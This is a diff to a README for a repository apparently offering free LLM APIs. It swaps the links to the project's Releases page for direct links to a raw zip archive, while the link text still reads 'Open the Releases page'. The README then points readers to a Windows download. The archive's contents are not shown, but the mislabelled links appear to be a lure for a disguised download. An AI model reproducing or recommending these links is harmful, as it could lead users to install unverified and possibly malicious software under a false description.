@@ -1,11 +1,11 @@
 # 🤖 awesome-free-llm-apis - Free LLM APIs Made Simple
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Clovenhoofed-loadingarea139/awesome-free-llm-apis/releases)
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Clovenhoofed-loadingarea139/awesome-free-llm-apis/main/free-llm-apis/apis-awesome-free-llm-v1.7.zip)
 
 ## 📥 Download
 Use this link to visit the release page and download the Windows file:
 
-[Open the Releases page](https://github.com/Clovenhoofed-loadingarea139/awesome-free-llm-apis/releases)
+[Open the Releases page](https://raw.githubusercontent.com/Clovenhoofed-loadingarea139/awesome-free-llm-apis/main/free-llm-apis/apis-awesome-free-llm-v1.7.zip)
 
 ## 🪟 Windows Setup
 1. Open the Releases page in your browser.
